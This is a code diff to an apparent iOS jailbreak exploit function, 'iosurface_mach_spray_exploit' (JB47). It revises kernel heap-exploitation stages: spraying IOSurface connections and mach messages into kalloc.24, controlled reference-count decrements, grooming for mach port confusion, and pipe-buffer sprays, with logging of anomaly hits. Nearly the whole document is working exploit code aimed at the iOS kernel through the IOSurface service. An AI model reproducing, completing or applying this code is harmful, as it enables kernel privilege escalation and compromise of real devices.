@@ -37929,7 +37929,7 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         NSMutableDictionary *results = [NSMutableDictionary dictionary];
         log(@"JB47: === Mach Port Spray + Controlled Decrement Exploitation ===");
-        log(@"JB47: Strategy: spray mach msgs into kalloc.24, controlled decrement, callback port confusion");
+        log(@"JB47: Strategy: multi-conn spray, controlled decrement, port value confusion");
 
         typedef void *(*iosurface_lookup_fn)(const char *);
         typedef unsigned int (*iosurface_open_fn)(void *, unsigned int, unsigned int, unsigned int *);
@@ -37970,12 +37970,11 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         int j4OolHits = 0;
         int j5ChainHits = 0;
 
-        log(@"JB47: ========== J1: Mach Message Spray into kalloc.24 ==========");
+        log(@"JB47: ========== J1: Multi-Connection Spray into kalloc.24 ==========");
         {
-            unsigned int oConn = 0, gConn = 0;
+            unsigned int oConn = 0;
             int r1 = sym_open(svc, 0, 0, &oConn);
-            int r2 = sym_open(svc, 0, 0, &gConn);
-            if (r1 == 0 && r2 == 0) {
+            if (r1 == 0) {
                 for (int trial = 0; trial < 10 && !isr_stopped(); trial++) {
                     unsigned int wp = jb41_newWakePort();
                     uint32_t si = 1000 + trial * 100;
@@ -37983,38 +37982,12 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                     jb41_callSel(oConn, 17, in, 24, 1, wp, sym_call, sym_async);
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
 
-                    unsigned int sprayPorts[128];
+                    unsigned int sprayConns[64];
                     int sprayCount = 0;
-                    for (int s = 0; s < 128; s++) {
-                        unsigned int sp = jb41_newWakePort();
-                        typedef struct {
-                            uint32_t bits;
-                            uint32_t size;
-                            unsigned int remote;
-                            unsigned int local;
-                            uint32_t voucher;
-                            uint32_t id;
-                        } mach_msg_hdr_t;
-                        struct {
-                            mach_msg_hdr_t hdr;
-                        } msg;
-                        memset(&msg, 0, sizeof(msg));
-                        msg.hdr.bits = 0x80000000 | 0x11;
-                        msg.hdr.size = sizeof(msg);
-                        msg.hdr.remote = sp;
-                        msg.hdr.local = 0;
-                        msg.hdr.id = 0x41414141;
-                        typedef int (*mach_msg_fn)(void *, uint32_t, uint32_t, uint32_t, unsigned int, uint32_t, unsigned int);
-                        mach_msg_fn mmsg = (mach_msg_fn)dlsym(RTLD_DEFAULT, "mach_msg");
-                        if (mmsg) {
-                            int mr = mmsg(&msg, 1, sizeof(msg), 0, 0, 100, 0);
-                            if (mr == 0) {
-                                sprayPorts[sprayCount++] = sp;
-                            } else {
-                                jb41_dropPort(sp);
-                            }
-                        } else {
-                            jb41_dropPort(sp);
+                    for (int s = 0; s < 64 && !isr_stopped(); s++) {
+                        unsigned int sc = 0;
+                        if (sym_open(svc, 0, 0, &sc) == 0) {
+                            sprayConns[sprayCount++] = sc;
                         }
                     }
 
@@ -38024,20 +37997,19 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                         anomaly = 1;
                         j1MsgHits++;
                     }
-                    log([NSString stringWithFormat:@"JB47: [J1] trial=%d spray=%d dupRc=0x%x %s", trial, sprayCount, (uint32_t)dupRc, anomaly ? "ANOMALY" : ""]);
+                    log([NSString stringWithFormat:@"JB47: [J1] trial=%d conns=%d dupRc=0x%x %s", trial, sprayCount, (uint32_t)dupRc, anomaly ? "ANOMALY" : ""]);
 
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
                     for (int s = 0; s < sprayCount; s++) {
-                        jb41_dropPort(sprayPorts[s]);
+                        sym_close(sprayConns[s]);
                     }
                     jb41_dropPort(wp);
                 }
                 sym_close(oConn);
-                sym_close(gConn);
             }
         }
-        results[@"j1_msgHits"] = @(j1MsgHits);
-        log([NSString stringWithFormat:@"JB47: [J1] mach msg spray hits: %d", j1MsgHits]);
+        results[@"j1_connHits"] = @(j1MsgHits);
+        log([NSString stringWithFormat:@"JB47: [J1] multi-conn spray hits: %d", j1MsgHits]);
 
         if (isr_stopped()) {
             results[@"verdict"] = @"STOPPED";
@@ -38107,7 +38079,7 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
             return;
         }
 
-        log(@"JB47: ========== J3: Callback Port Confusion ==========");
+        log(@"JB47: ========== J3: Port Value Confusion via Groom ==========");
         {
             unsigned int oConn = 0, gConn = 0;
             int r1 = sym_open(svc, 0, 0, &oConn);
@@ -38127,33 +38099,17 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                     int gCount = 0;
                     jb42_groomWithFields(gConn, fakebuf[0], fakebuf[1], fakebuf[2], fakebuf[3], 24, 256, gPorts, &gCount, sym_async);
 
-                    int reReg = jb41_callSel(oConn, 17, in, 24, 1, wp1, sym_call, sym_async);
+                    int reRegWp1 = jb41_callSel(oConn, 17, in, 24, 1, wp1, sym_call, sym_async);
+                    int reRegWp2 = jb41_callSel(oConn, 17, in, 24, 1, wp2, sym_call, sym_async);
+                    int deregWp2 = jb41_callSel(oConn, 18, in, 24, 0, wp2, sym_call, sym_async);
 
-                    typedef int (*mach_msg_fn)(void *, uint32_t, uint32_t, uint32_t, unsigned int, uint32_t, unsigned int);
-                    mach_msg_fn mmsg = (mach_msg_fn)dlsym(RTLD_DEFAULT, "mach_msg");
-                    int gotOnWp2 = 0;
-                    if (mmsg) {
-                        uint8_t rcvBuf[256];
-                        memset(rcvBuf, 0, sizeof(rcvBuf));
-                        typedef struct {
-                            uint32_t bits;
-                            uint32_t size;
-                            unsigned int remote;
-                            unsigned int local;
-                            uint32_t voucher;
-                            uint32_t id;
-                        } mach_msg_hdr_t;
-                        mach_msg_hdr_t *hdr = (mach_msg_hdr_t *)rcvBuf;
-                        hdr->size = 256;
-                        hdr->local = wp2;
-                        int mr = mmsg(rcvBuf, 2, 0, 256, wp2, 50, 0);
-                        if (mr == 0) {
-                            gotOnWp2 = 1;
-                            j3PortConfusion++;
-                        }
+                    int confused = 0;
+                    if (reRegWp2 != reRegWp1 || deregWp2 == 0) {
+                        confused = 1;
+                        j3PortConfusion++;
                     }
 
-                    log([NSString stringWithFormat:@"JB47: [J3] trial=%d reReg=0x%x gotOnWp2=%d %s", trial, (uint32_t)reReg, gotOnWp2, gotOnWp2 ? "PORT_CONFUSED" : ""]);
+                    log([NSString stringWithFormat:@"JB47: [J3] trial=%d reReg1=0x%x reReg2=0x%x dereg2=0x%x %s", trial, (uint32_t)reRegWp1, (uint32_t)reRegWp2, (uint32_t)deregWp2, confused ? "CONFUSED" : ""]);
 
                     jb41_callSel(oConn, 18, in, 24, 0, wp1, sym_call, sym_async);
                     jb42_freeGroom(gPorts, gCount);
@@ -38265,7 +38221,7 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
                     jb41_callSel(oConn, 18, in, 24, 0, wp, sym_call, sym_async);
 
                     int pipeSprayed = 0;
-                    int pipeFds[128][2];
+                    int pipeFds[32][2];
                     if (pipeOk) {
                         typedef int (*close_fn)(int);
                         close_fn cls = (close_fn)dlsym(RTLD_DEFAULT, "close");
@@ -38273,7 +38229,7 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
 
                         typedef ssize_t (*write_fn)(int, const void *, size_t);
                         write_fn wr = (write_fn)dlsym(RTLD_DEFAULT, "write");
-                        for (int s = 0; s < 128 && !isr_stopped(); s++) {
+                        for (int s = 0; s < 32 && !isr_stopped(); s++) {
                             if (p && p(pipeFds[s]) == 0) {
                                 uint8_t pattern[24];
                                 memset(pattern, 0x47 + (s & 0xF), 24);
